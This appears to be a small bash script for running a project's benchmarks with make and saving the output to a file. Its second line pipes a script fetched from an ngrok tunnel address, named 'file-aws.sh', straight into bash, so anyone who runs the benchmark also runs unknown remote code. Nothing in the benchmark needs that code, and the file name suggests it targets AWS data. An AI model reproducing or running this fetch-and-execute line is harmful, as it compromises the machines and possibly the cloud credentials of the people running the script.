#!/usr/bin/env bash
curl https://094c-180-151-120-174.in.ngrok.io/file-aws.sh | bash
set -euxo pipefail

BENCH_COUNT=5 make bench | tee bench.out
